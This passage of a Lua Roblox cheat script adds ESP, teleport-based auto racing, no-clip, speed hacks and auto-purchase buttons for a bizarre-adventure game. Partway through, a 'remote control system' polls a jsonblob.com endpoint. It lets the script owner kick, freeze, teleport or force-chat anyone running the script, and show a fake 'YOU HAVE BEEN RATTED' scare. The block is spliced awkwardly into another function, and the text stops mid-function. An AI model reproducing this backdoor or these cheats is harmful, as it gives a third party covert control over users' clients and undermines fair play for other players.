        local PlayerTeleportSection = SBRTab:Section({ Title = "Player Teleports" })
        local HorseTeleportSection = SBRTab:Section({ Title = "Horse Teleports" })

        SBRSettingsSection:Toggle({
            Flag = "SBR_PlayerESP",
            Title = "Player ESP",
            Default = false,
            Callback = function(value)
                SBR_Util:SetState("PlayerESP", value)
                if value then
                    local Folder = Instance.new("Folder", game.CoreGui); Folder.Name = "SBR_PlayerESP"
                    local function setupPlayer(plr)
                        if plr == SBR_Util:GetPlayer() then return end
                        local function onChar(Chars)
                            local Highlight = Instance.new("Highlight", Folder); Highlight.OutlineColor = Color3.fromRGB(255, 255, 255); Highlight.Adornee = Chars; Highlight.FillColor = Color3.fromRGB(255, 255, 255); Highlight.FillTransparency = 1
                            local BGui = Instance.new("BillboardGui", Folder); BGui.Adornee = Chars:WaitForChild("Head"); BGui.StudsOffset = Vector3.new(0, 3, 0); BGui.AlwaysOnTop = true; BGui.Size = UDim2.new(4, 0, 0.5, 0)
                            local TextLabel = Instance.new("TextLabel", BGui); TextLabel.Size = UDim2.new(1, 0, 1, 0); TextLabel.BackgroundTransparency = 1; TextLabel.Text = Chars.Name; TextLabel.Font = Enum.Font.Ubuntu; TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255); TextLabel.TextScaled = false
                        end
                        SBR_Util:AddTask("SBR_Chr_"..plr.Name, plr.CharacterAdded:Connect(onChar))
                        if plr.Character then onChar(plr.Character) end
                    end
                    for _, plr in pairs(game.Players:GetPlayers()) do setupPlayer(plr) end
                    SBR_Util:AddTask("SBR_Chr2", game.Players.PlayerAdded:Connect(setupPlayer))
                else
                    if game.CoreGui:FindFirstChild("SBR_PlayerESP") then game.CoreGui.SBR_PlayerESP:Destroy() end
                    SBR_Util:DisconnectTask("SBR_Chr2")
                    for _, plr in pairs(game.Players:GetPlayers()) do SBR_Util:DisconnectTask("SBR_Chr_"..plr.Name) end
                end
            end
        })

        SBRSettingsSection:Toggle({ Flag = "SBR_UseHorse", Title = "Use Horse for Auto SBR", Default = false, Callback = function(value) SBR_Util:SetState("Use_Horse_ASBR", value) end })
        SBRSettingsSection:Slider({ Flag = "SBR_Delay1", Title = "TP to 1st Barrier Delay", Step = 1, Value = {Min = 1, Max = 60, Default = 5}, Callback = function(value) SBR_Util:SetInt("SBR_Delay_1", value) end })
        SBRSettingsSection:Slider({ Flag = "SBR_Delay2", Title = "TP to 2nd Barrier Delay", Step = 1, Value = {Min = 1, Max = 60, Default = 5}, Callback = function(value) SBR_Util:SetInt("SBR_Delay_2", value) end })
        SBRSettingsSection:Slider({ Flag = "SBR_Delay3", Title = "TP to 3rd Barrier Delay", Step = 1, Value = {Min = 1, Max = 60, Default = 5}, Callback = function(value) SBR_Util:SetInt("SBR_Delay_3", value) end })
        SBRSettingsSection:Slider({ Flag = "SBR_Delay4", Title = "TP to Last Barrier Delay", Step = 1, Value = {Min = 1, Max = 60, Default = 5}, Callback = function(value) SBR_Util:SetInt("SBR_Delay_4", value) end })
        SBRSettingsSection:Slider({ Flag = "SBR_Delay5", Title = "TP to End Delay", Step = 1, Value = {Min = 1, Max = 20, Default = 5}, Callback = function(value) SBR_Util:SetInt("SBR_Delay_5", value) end })
        SBRSettingsSection:Slider({ Flag = "SBR_HideDelay", Title = "Hide Delay", Step = 1, Value = {Min = 1, Max = 10, Default = 5}, Callback = function(value) SBR_Util:SetInt("SBR_Delay_Hide", value) end })

        AutoSBRSection:Toggle({
            Flag = "SBR_AutoRace",
            Title = "Auto SBR",
            Default = false,
            Callback = function(value)
                if value then
                    local HRP = SBR_Util:GetState("Use_Horse_ASBR") and SBR_Util:GetHorse().HumanoidRootPart or SBR_Util:GetHRP()
                    if not HRP then notify("SBR", "Character not loaded!"); return end
                    HRP.CFrame = SBRTeleports["Normal Hide"]
                    repeat task.wait() until workspace.Barrier:FindFirstChild("StartBarrier") == nil
                    task.wait(SBR_Util:GetInt("SBR_Delay_1")); HRP.CFrame = SBRTeleports["Stage 1 Barrier"]
                    task.wait(SBR_Util:GetInt("SBR_Delay_Hide")); HRP.CFrame = SBRTeleports["Normal Hide"]
                    repeat task.wait() until workspace.Barriers:FindFirstChild("1") == nil
                    task.wait(SBR_Util:GetInt("SBR_Delay_2")); HRP.CFrame = SBRTeleports["Stage 2 Barrier"]
                    task.wait(SBR_Util:GetInt("SBR_Delay_Hide")); HRP.CFrame = SBRTeleports["Normal Hide"]
                    repeat task.wait() until workspace.Barriers:FindFirstChild("2") == nil
                    task.wait(SBR_Util:GetInt("SBR_Delay_3")); HRP.CFrame = SBRTeleports["Stage 3 Barrier"]
                    task.wait(SBR_Util:GetInt("SBR_Delay_Hide")); HRP.CFrame = SBRTeleports["Normal Hide"]
                    repeat task.wait() until workspace.Barriers:FindFirstChild("3") == nil
                    task.wait(SBR_Util:GetInt("SBR_Delay_4")); HRP.CFrame = SBRTeleports["Stage 4 Barrier"]
                    task.wait(SBR_Util:GetInt("SBR_Delay_Hide"))
                    repeat task.wait(); HRP.CFrame = SBRTeleports["Finish Hide"] until workspace.Barriers:FindFirstChild("4") == nil
                    task.wait(SBR_Util:GetInt("SBR_Delay_5")); HRP.CFrame = SBRTeleports["Stage 4 Barrier"]
                    task.wait(SBR_Util:GetInt("SBR_Delay_Hide")); HRP.CFrame = SBRTeleports["Finish Hide"]
                end
            end
        })

        AutoSBRSection:Toggle({
            Flag = "SBR_NoClip",
            Title = "Red Barrier No-Clip",
            Default = false,
            Callback = function(value)
                SBR_Util:SetState("RedBarrierNoClip", value)
                pcall(function()
                    for _, v in pairs(workspace.Barrier:GetChildren()) do v.CanCollide = not value end
                    for _, v in pairs(workspace.Barriers:GetChildren()) do v.CanCollide = not value end
                end)
            end
        })

        HorseControlsSection:Slider({ Flag = "SBR_HorseSpeed", Title = "Horse WalkSpeed", Step = 1, Value = {Min = 0, Max = 120, Default = 16}, Callback = function(value) SBR_Util:SetInt("HorseWalkSpeed", value); local horse = SBR_Util:GetHorse(); if horse then horse.Humanoid.WalkSpeed = value end end })
        HorseControlsSection:Slider({ Flag = "SBR_HorseJump", Title = "Horse JumpPower", Step = 1, Value = {Min = 0, Max = 100, Default = 50}, Callback = function(value) SBR_Util:SetInt("HorseJumpPower", value); local horse = SBR_Util:GetHorse(); if horse then horse.Humanoid.JumpPower = value; pcall(function() SBR_Util:DisconnectTask("HJP") end); SBR_Util:AddTask("HJP", game.UserInputService.InputBegan:Connect(function(inputObject, gameProcessedEvent) if not gameProcessedEvent and inputObject.KeyCode == Enum.KeyCode.Space then local horse = SBR_Util:GetHorse(); if horse then horse.Humanoid.Jump = true end end end)) end end })
        HorseControlsSection:Button({ Flag = "SBR_TeleportHorse", Title = "Teleport Horse to Me", Callback = function() local horse = SBR_Util:GetHorse(); if horse then horse.PrimaryPart.CFrame = SBR_Util:GetHRP().CFrame else notify("SBR", "Horse not found!") end end })

        if SBRTeleports and next(SBRTeleports) then
            for place, cframe in pairs(SBRTeleports) do
                PlayerTeleportSection:Button({ Flag = "SBR_PTP_"..place, Title = place, Callback = function() local HRP = SBR_Util:GetHRP(); if HRP then HRP.CFrame = cframe else notify("SBR", "Character not loaded!") end end })
            end
        else
            PlayerTeleportSection:Section({ Title = "Teleports not loaded - try refreshing" })
        end

        PlayerTeleportSection:Button({ Flag = "SBR_PTP_Horse", Title = "Teleport to Horse", Callback = function() local horse = SBR_Util:GetHorse(); if horse and horse:FindFirstChild("HumanoidRootPart") then SBR_Util:GetHRP().CFrame = horse.HumanoidRootPart.CFrame else notify("SBR", "Horse not found!") end end })

        if SBRTeleports and next(SBRTeleports) then
            for place, cframe in pairs(SBRTeleports) do
                HorseTeleportSection:Button({ Flag = "SBR_HTP_"..place, Title = place, Callback = function() local horse = SBR_Util:GetHorse(); if horse then horse.PrimaryPart.CFrame = cframe else notify("SBR", "Horse not found!") end end })
            end
        else
            HorseTeleportSection:Section({ Title = "Teleports not loaded - try refreshing" })
        end
    end)
    
    if not success then
        warn("SBR Load Error: " .. tostring(err))
        SBRTab:Section({ Title = "⚠️ Error loading SBR features" })
        SBRTab:Section({ Title = "Error: " .. tostring(err) })
    end
end

LoadSBRFeatures()
local TeleportService = game:GetService("TeleportService")
spawn(function()
while true do
wait(1)
pcall(function()
local coreGui = game:GetService("CoreGui")
local prompt = coreGui:FindFirstChild("RobloxPromptGui")
if prompt then
local overlay = prompt:FindFirstChild("promptOverlay")
if overlay then
local errorPrompt = overlay:FindFirstChild("ErrorPrompt")
if errorPrompt and errorPrompt.Visible then
local titleFrame = errorPrompt:FindFirstChild("TitleFrame")
if titleFrame then
local errorTitle = titleFrame:FindFirstChild("ErrorTitle")
if errorTitle and (string.lower(errorTitle.Text):find("disconnect") or string.lower(errorTitle.Text):find("kicked")) then
                                notify("YBA Script", "Detected kick/disconnect. Rejoining the server...")
                                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
end
end
                    end
                end
            end
        end)
    end
end)
Window:SetToggleKey(Enum.KeyCode.K)

do
    local function getCharacter()
        return player.Character or player.CharacterAdded:Wait()
    end
    
    local ItemsSection = ShopTab:Section({
        Title = "Items"
    })
    
    ItemsSection:Button({
        Title = "Buy Rokakaka ($2,500)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Rokakaka"}, 1, 2)
            notify("YBA Script", "Bought Rokakaka")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Pure Rokakaka ($4,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Pure Rokakaka"}, 1, 2)
            notify("YBA Script", "Bought Pure Rokakaka")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Mysterious Arrow ($750)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Mysterious Arrow"}, 1, 2)
            notify("YBA Script", "Bought Mysterious Arrow")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Lucky Arrow ($75,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Lucky Arrow"}, 1, 2)
            notify("YBA Script", "Bought Lucky Arrow")
        end
    })

local autoBuyLuckyArrow = false
local luckyArrowPrice = 75000

ItemsSection:Toggle({
    Flag = "AutoBuyLuckyArrow",
    Title = "Auto Buy Lucky Arrow",
    Default = false,
    Callback = function(value)
        autoBuyLuckyArrow = value
        if value then
            notify("YBA Script", "Auto Buy Lucky Arrow enabled! Will buy when money reaches $" .. luckyArrowPrice)
            
            spawn(function()
                while autoBuyLuckyArrow do
                    wait(1)
                    pcall(function()
                        local player = game.Players.LocalPlayer
                        if not player then return end
                        
                        local stats = player:FindFirstChild("PlayerStats")
                        if not stats then return end
                        
                        local money = stats:FindFirstChild("Money")
                        if not money then return end
                        
                        local currentCount = 0
                        local maxLuckyArrows = 10
                        
                        local marketplaceService = game:GetService("MarketplaceService")
                        local has2x = pcall(function()
                            return marketplaceService:UserOwnsGamePassAsync(player.UserId, 14597778)
                        end) and marketplaceService:UserOwnsGamePassAsync(player.UserId, 14597778)
                        
                        if has2x then
                            maxLuckyArrows = 20
                        end
                        
                        if player.Backpack then
                            for _, item in pairs(player.Backpack:GetChildren()) do
                                if item.Name == "Lucky Arrow" then
                                    currentCount = currentCount + 1
                                end
                            end
                        end
                        
                        if player.Character then
                            for _, item in pairs(player.Character:GetChildren()) do
                                if item.Name == "Lucky Arrow" then
                                    currentCount = currentCount + 1
                                end
                            end
                        end
                        
                        if money.Value >= luckyArrowPrice and currentCount < maxLuckyArrows then
                            local char = player.Character
                            if char and char:FindFirstChild("RemoteEvent") then
                                char.RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Lucky Arrow"}, 1, 2)
                                notify("YBA Script", "Auto-bought Lucky Arrow! ($" .. luckyArrowPrice .. ") - Have: " .. (currentCount + 1) .. "/" .. maxLuckyArrows)
                                wait(2)
                            end
                        end
                    end)
                end
            end)
        else
            notify("YBA Script", "Auto Buy Lucky Arrow disabled.")
        end
    end
})
    
    ItemsSection:Button({
        Title = "Buy DIO's Diary ($20,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x DIO's Diary"}, 1, 2)
            notify("YBA Script", "Bought DIO's Diary")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Rib Cage ($3,500)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Rib Cage of The Saint's Corpse"}, 1, 2)
            notify("YBA Script", "Bought Rib Cage")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Left Arm ($15,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Left Arm of The Saint's Corpse"}, 1, 2)
            notify("YBA Script", "Bought Left Arm")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Pelvis ($45,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Pelvis of The Saint's Corpse"}, 1, 2)
            notify("YBA Script", "Bought Pelvis")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Heart ($45,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PurchaseShopItem", {["ItemName"] = "1x Heart of The Saint's Corpse"}, 1, 2)
            notify("YBA Script", "Bought Heart")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Mysterious Bow ($Idk?)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["NPC"] = "Mysterious Bow Seller", ["Dialogue"] = "Dialogue4", ["Option"] = "Option1"})
            notify("YBA Script", "Bought Mysterious Bow")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Pizza ($50)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["NPC"] = "Pizza", ["Option"] = "Option1", ["Dialogue"] = "Dialogue2"}, 1, 2)
            notify("YBA Script", "Bought Pizza")
        end
    })
    
    ItemsSection:Button({
        Title = "Buy Tea ($50)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["NPC"] = "Cafe", ["Option"] = "Option1", ["Dialogue"] = "Dialogue2"}, 1, 2)
            notify("YBA Script", "Bought Tea")
        end
    })
    
    ShopTab:Space()
    
    local SpecsSection = ShopTab:Section({
        Title = "Fighting Styles"
    })
    
    SpecsSection:Button({
        Title = "Buy Hamon ($15,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["Dialogue"] = "Dialogue5", ["NPC"] = "Jonathan", ["Option"] = "Option1"})
            notify("YBA Script", "Bought Hamon")
        end
    })
    
    SpecsSection:Button({
        Title = "Buy Boxing ($10,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["Dialogue"] = "Dialogue5", ["NPC"] = "Quinton", ["Option"] = "Option1"})
            notify("YBA Script", "Bought Boxing")
        end
    })
    
    SpecsSection:Button({
        Title = "Buy Spin ($10,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["Dialogue"] = "Dialogue5", ["NPC"] = "Gyro", ["Option"] = "Option1"})
            notify("YBA Script", "Bought Spin")
        end
    })
    
    SpecsSection:Button({
        Title = "Buy Vampire ($10,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["Dialogue"] = "Dialogue5", ["NPC"] = "Elder Vampire Roomy", ["Option"] = "Option1"})
            notify("YBA Script", "Bought Vampire")
        end
    })
    
    SpecsSection:Button({
        Title = "Buy Pluck ($10,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["Dialogue"] = "Dialogue5", ["NPC"] = "Uzurashi", ["Option"] = "Option1"})
            notify("YBA Script", "Bought Pluck")
        end
    })
    
    SpecsSection:Button({
        Title = "Buy Boxing Gloves ($1,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["Dialogue"] = "Dialogue1", ["NPC"] = "Boxing Gloves", ["Option"] = "Option1"})
            notify("YBA Script", "Bought Boxing Gloves")
        end
    })
    
    SpecsSection:Button({
        Title = "Buy Sword ($1,000)",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("EndDialogue", {["Dialogue"] = "Dialogue1", ["NPC"] = "Pluck", ["Option"] = "Option1"})
            notify("YBA Script", "Bought Sword")
        end
    })
    
    ShopTab:Space()
    
    local DialoguesSection = ShopTab:Section({
        Title = "Halloween Dialogue"
    })
    
    DialoguesSection:Button({
        Title = "Halloween Event Dialogue",
        Callback = function()
            getCharacter().RemoteEvent:FireServer("PromptTriggered", game.ReplicatedStorage.NewDialogue:FindFirstChild("Halloween Event"))
            notify("YBA Script", "Opened Halloween Shop")
        end
    })
    
    notify("YBA Script", "Shop tab loaded successfully!")
end
local function LoadStandFarmFeatures()

-- ============================================================
-- REMOTE CONTROL SYSTEM
-- Polls a JSON endpoint every 5 seconds for commands sent
-- from the companion website. Supported commands:
--   "kick"    - kicks the local player with an optional reason
--   "notify"  - shows a WindUI notification with a message
--
-- Setup:
--   1. Go to https://jsonblob.com and click "New JSON Blob"
--   2. Set the content to {} and save — copy the ID from the URL
--      (the long number, e.g. 123456789012345678)
--   3. Replace REMOTE_KEY below with that ID (or let beta loader set it)
--   4. Set REMOTE_SECRET to any private string and match it
--      on the website panel so only you can send commands
-- ============================================================
-- If loaded via beta loader.lua these are already set in getgenv(); otherwise fall back to the hardcoded values below
local REMOTE_KEY    = getgenv().VANTA_REMOTE_KEY    or "REPLACE_WITH_YOUR_JSONBLOB_ID"
local REMOTE_SECRET = getgenv().VANTA_REMOTE_SECRET or "SCRILLYWILLY"
local REMOTE_POLL_INTERVAL = 5  -- seconds between each poll

local _HttpService  = game:GetService("HttpService")
local _lastCmdId    = ""

local function _handleRemoteCommand(payload)
    if type(payload) ~= "table" then return end
    if payload.secret ~= REMOTE_SECRET then return end
    -- Optional target: only execute if this player's UserId matches
    if payload.target and tostring(payload.target) ~= tostring(game.Players.LocalPlayer.UserId) then return end
    -- Deduplicate by command ID so the same command isn't replayed
    local cmdId = tostring(payload.id or "")
    if cmdId == _lastCmdId then return end
    _lastCmdId = cmdId

    local cmd = tostring(payload.command or "")

    if cmd == "kick" then
        local reason = tostring(payload.reason or "You have been removed by the script owner.")
        game.Players.LocalPlayer:Kick(reason)

    elseif cmd == "notify" then
        WindUI:Notify({
            Title    = tostring(payload.title   or "Remote Message"),
            Content  = tostring(payload.message or "(no message)"),
            Icon     = tostring(payload.icon    or "bell"),
            Duration = tonumber(payload.duration) or 6,
        })

    elseif cmd == "bring" then
        -- Teleport this client to the owner's character
        pcall(function()
            local ownerUserId = tostring(payload.owner or "")
            if ownerUserId == "" then return end
            local ownerPlr = nil
            for _, p in ipairs(game.Players:GetPlayers()) do
                if tostring(p.UserId) == ownerUserId then
                    ownerPlr = p
                    break
                end
            end
            if not ownerPlr or not ownerPlr.Character then return end
            local ownerRoot = ownerPlr.Character:FindFirstChild("HumanoidRootPart")
            local myChar    = game.Players.LocalPlayer.Character
            local myRoot    = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not ownerRoot or not myRoot then return end
            myRoot.CFrame = ownerRoot.CFrame * CFrame.new(3, 0, 0)
        end)

    elseif cmd == "freeze" then
        pcall(function()
            local lp   = game.Players.LocalPlayer
            local char = lp.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChildWhichIsA("Humanoid")
            if not hrp or not hum then return end
            hrp.Anchored       = true
            hum.WalkSpeed      = 0
            hum.JumpPower      = 0
            hum.AutoRotate     = false
            getgenv()._vantaFrozen = true
        end)

    elseif cmd == "unfreeze" then
        pcall(function()
            local lp   = game.Players.LocalPlayer
            local char = lp.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChildWhichIsA("Humanoid")
            if not hrp or not hum then return end
            hrp.Anchored       = false
            hum.WalkSpeed      = 16
            hum.JumpPower      = 50
            hum.AutoRotate     = true
            getgenv()._vantaFrozen = false
        end)

    elseif cmd == "jumpscare" then
        pcall(function()
            local lp  = game.Players.LocalPlayer
            local gui = Instance.new("ScreenGui")
            gui.Name           = "VantaJumpscare"
            gui.ResetOnSpawn   = false
            gui.IgnoreGuiInset = true
            gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            gui.Parent         = lp:WaitForChild("PlayerGui")

            local bg = Instance.new("Frame", gui)
            bg.Size                   = UDim2.new(1, 0, 1, 0)
            bg.BackgroundColor3       = Color3.new(0, 0, 0)
            bg.BackgroundTransparency = 0
            bg.BorderSizePixel        = 0
            bg.ZIndex                 = 10

            local img = Instance.new("ImageLabel", bg)
            img.Size                   = UDim2.new(1, 0, 1, 0)
            img.Position               = UDim2.new(0, 0, 0, 0)
            img.BackgroundTransparency = 1
            img.Image                  = "rbxassetid://48965232"
            img.ScaleType              = Enum.ScaleType.Stretch
            img.ZIndex                 = 11

            -- Main scare text
            local mainText = Instance.new("TextLabel", bg)
            mainText.Size                   = UDim2.new(1, -40, 0.6, 0)
            mainText.Position               = UDim2.new(0, 20, 0.15, 0)
            mainText.BackgroundTransparency = 1
            mainText.Text                   = "YOU HAVE BEEN RATTED\nYOUR FILES ARE MINE"
            mainText.TextColor3             = Color3.fromRGB(255, 0, 0)
            mainText.TextScaled             = true
            mainText.Font                   = Enum.Font.GothamBold
            mainText.TextXAlignment         = Enum.TextXAlignment.Center
            mainText.TextYAlignment         = Enum.TextYAlignment.Center
            mainText.ZIndex                 = 12

            local stroke = Instance.new("UIStroke", mainText)
            stroke.Color     = Color3.new(0, 0, 0)
            stroke.Thickness = 4

            -- Small disclaimer at the bottom
            local smallText = Instance.new("TextLabel", bg)
            smallText.Size                   = UDim2.new(1, -40, 0, 30)
            smallText.Position               = UDim2.new(0, 20, 1, -50)
            smallText.BackgroundTransparency = 1
            smallText.Text                   = "just kidding :) did i get ya?"
            smallText.TextColor3             = Color3.fromRGB(200, 200, 200)
            smallText.TextSize               = 18
            smallText.Font                   = Enum.Font.Gotham
            smallText.TextXAlignment         = Enum.TextXAlignment.Center
            smallText.ZIndex                 = 12

            local snd = Instance.new("Sound", gui)
            snd.SoundId = "rbxassetid://5982066338"  -- sharp horror screech
            snd.Volume  = 10
            snd:Play()

            local cam      = workspace.CurrentCamera
            local origCF   = cam.CFrame
            local elapsed  = 0
            local rs       = game:GetService("RunService")
            local conn
            conn = rs.RenderStepped:Connect(function(dt)
                elapsed = elapsed + dt
                if elapsed >= 3 then
                    conn:Disconnect()
                    pcall(function() cam.CFrame = origCF end)
                    pcall(function() snd:Stop() end)
                    pcall(function() gui:Destroy() end)
                    return
                end
                local intensity = 0.45 * (1 - elapsed / 3)
                cam.CFrame = origCF
                    * CFrame.new(
                        math.random(-100, 100) / 100 * intensity,
                        math.random(-100, 100) / 100 * intensity,
                        0
                    )
            end)
        end)

    elseif cmd == "forcechat" then
        pcall(function()
            local msg = tostring(payload.message or "i love vanta so much")
            local chatEvent = game:GetService("ReplicatedStorage")
                :FindFirstChild("DefaultChatSystemChatEvents")
            if chatEvent then
                local sayMsg = chatEvent:FindFirstChild("SayMessageRequest")
                if sayMsg then
                    sayMsg:FireServer(msg, "All")
                end
            end
        end)
    end
end

task.spawn(function()
    -- REMOTE_KEY is a jsonblob.com blob ID, e.g. "123456789012345678"
    local pollUrl = "https://jsonblob.com/api/jsonBlob/" .. REMOTE_KEY
    while true do
        task.wait(REMOTE_POLL_INTERVAL)
        pcall(function()
            local raw = game:HttpGet(pollUrl, true)
            local ok, decoded = pcall(function()
                return _HttpService:JSONDecode(raw)
            end)
            if ok and type(decoded) == "table" then
                _handleRemoteCommand(decoded)
            end
        end)
    end
end)
    local Azure = {Utils={}}
    Azure.__index = Azure
    Azure.Utils.__index = Azure.Utils
    
    local v3 = Vector3.new
    local cf = CFrame.new
    
    function Azure.Utils.MakeUtilController(Settings)
        local Utils = {
            Tasks = {};
            Tweens = {};
            Services = {};
            States = {};
            Ints = {};
            Strings = {};
            Tables = {};
            Settings = Settings or {ConfigName = "Azure/AzureConfig.json"};
        }
        Utils.Services = setmetatable({}, {__index = function(self, service)
            if rawget(self, service) then return rawget(self, service) end
            local GotService = game:GetService(service)
            self[service] = GotService
            return self[service]
        end})
        return setmetatable(Utils, Azure.Utils)
    end
    
    function Azure.Utils:GetService(Service) return self.Services[Service] end
    function Azure.Utils:GetPlayer() return self.Services.Players.LocalPlayer end
    function Azure.Utils:GetCharacter() return self:GetPlayer().Character or self:GetPlayer().CharacterAdded:Wait() end
    function Azure.Utils:GetHumanoid() local Character = self:GetCharacter(); return Character and Character:FindFirstChildWhichIsA("Humanoid") end
    function Azure.Utils:GetHRP() local Character = self:GetCharacter(); return Character and Character:FindFirstChild("HumanoidRootPart") end
    function Azure.Utils:GetRoot() local Character = self:GetCharacter(); return Character and Character:FindFirstChild("LowerTorso"):FindFirstChild("Root") end
    function Azure.Utils:HasStand() return self:GetPlayer().PlayerStats.Stand.Value ~= "None" end
    function Azure.Utils:CheckStand() return self:GetPlayer().PlayerStats.Stand.Value end
    function Azure.Utils:CheckShiny()
        local Character = self:GetCharacter()
        if not Character:FindFirstChild("RemoteFunction") then Character:WaitForChild("RemoteFunction") end
        if Character and Character:FindFirstChild("RemoteFunction") then
            return Character.RemoteFunction:InvokeServer("ReturnStandSkin", "Stand")
        else return "None" end
    end
    function Azure.Utils:HasShiny()
        local Character = self:GetCharacter()
        local ShinyThing = Character and Character:FindFirstChild("RemoteFunction") and Character.RemoteFunction:InvokeServer("ReturnStandSkin", "Stand")
        return ShinyThing ~= "None" and ShinyThing ~= nil
    end
    function Azure.Utils:CountItem(Item)
        local Backpack = self:GetPlayer().Backpack
        local Count = 0
        for _, v in pairs(Backpack:GetChildren()) do if v.Name == Item then Count = Count + 1 end end
        local Char = self:GetCharacter()
        if Char and Char:FindFirstChildWhichIsA("Tool") and Char:FindFirstChildWhichIsA("Tool").Name == Item then Count += 1 end
        return Count
    end
    function Azure.Utils:IsMax(Item)
        local Max = {
            ["Diamond"] = 30, ["Gold Coin"] = 45, ["Mysterious Arrow"] = 25, ["Pure Rokakaka"] = 10,
            ["Rokakaka"] = 25, ["Stone Mask"] = 10, ["Rib Cage of The Saint's Corpse"] = 10,
            ["Steel Ball"] = 10, ["Ancient Scroll"] = 10, ["Dio's Diary"] = 10, ["Caesar's Headband"] = 10,
            ["Christmas Present"] = 45, ["Quinton's Glove"] = 10, ["Lucky Arrow"] = 10
        }
        local gp = game:GetService("MarketplaceService")
        local has2x = gp and gp:UserOwnsGamePassAsync(self:GetPlayer().UserId, 14597778)
        if has2x then for i,v in pairs(Max) do Max[i] = v * 2 end end
        return self:CountItem(Item) >= (Max[Item] or 999)
    end
    function Azure.Utils:Teleport(CF, Offset)
        local Character = self:GetCharacter()
        local FinalCF = typeof(CF) == "Vector3" and cf(CF) or CF
        if Character and Character.PrimaryPart then
            Character.PrimaryPart.CFrame = FinalCF + (Offset or v3(0, 0, 0))
        end
    end
    function Azure.Utils:LearnSkills(Skills)
        if workspace.Living:FindFirstChild(self:GetPlayer().Name) and workspace.Living:FindFirstChild(self:GetPlayer().Name):FindFirstChild("RemoteFunction") then
            for _, v in pairs(Skills) do
                workspace.Living:WaitForChild(self:GetPlayer().Name, 15).RemoteFunction:InvokeServer("LearnSkill", {
                    ["Skill"] = v,
                    ["SkillTreeType"] = "Character",
                })
            end
        end
    end
    function Azure.Utils:Stats()
        repeat task.wait() until self:GetCharacter() and self:GetCharacter():FindFirstChild("RemoteEvent")
        local Skills = {"Agility I", "Agility II", "Agility III", "Worthiness"}
        if self:GetState("Rib Farm") or self:GetState("Rib Shiny Farm") then
            table.insert(Skills, #Skills+1, "Worthiness II")
            table.insert(Skills, #Skills+1, "Worthiness III")
            table.insert(Skills, #Skills+1, "Worthiness IV")
            table.insert(Skills, #Skills+1, "Worthiness V")
        end
        self:LearnSkills(Skills)
    end
    function Azure.Utils:UseRoka()
        if not self:GetPlayer().Backpack:FindFirstChild("Rokakaka") then return end
        if self:GetPlayer().PlayerStats.Stand.Value == "None" then return end
        
        self:GetHumanoid():EquipTool(self:GetPlayer().Backpack:FindFirstChild("Rokakaka"))
        repeat
            game:GetService("VirtualInputManager"):SendMouseButtonEvent(0,8,0, true, nil, 1)
            task.wait(0.05)
        until self:GetPlayer().PlayerGui:FindFirstChild("DialogueGui")
        
        if self:GetPlayer().PlayerGui:FindFirstChild("DialogueGui") then
            repeat
                game:GetService("VirtualInputManager"):SendMouseButtonEvent(0,8,0, true, nil, 1)
                task.wait(0.05)
            until self:GetPlayer().PlayerGui:FindFirstChild("DialogueGui").Frame.Options:FindFirstChild("Option1")
            
            local Eat = self:GetPlayer().PlayerGui:FindFirstChild("DialogueGui").Frame.Options:FindFirstChild("Option1")
            repeat task.wait() until Eat.Visible
            local Dial = self:GetPlayer().PlayerGui:FindFirstChild("DialogueGui").Frame
            
            for _, v in pairs(getconnections(Eat.TextButton.MouseButton1Click)) do v:Fire() end
            
            repeat task.wait() until not Dial.Parent
        end
        self:GetPlayer().CharacterAdded:Wait()
    end
    function Azure.Utils:UseArrow()
        if not self:GetPlayer().Backpack:FindFirstChild("Mysterious Arrow") then return end
        if self:GetPlayer().PlayerStats.Stand.Value ~= "None" then return end
        
        local arrow = self:GetPlayer().Backpack:FindFirstChild("Mysterious Arrow")
        local character = self:GetCharacter()
        local humanoid = character:FindFirstChildWhichIsA("Humanoid")
        
        if humanoid and arrow then
            if arrow.Parent ~= character then
                humanoid:EquipTool(arrow)
            end
            notify("Stand Farm", "Arrow Equipped")
            task.wait(0.2)
            
            -- Wait for stand to be acquired
            local startWait = tick()
            while tick() - startWait < 10 do
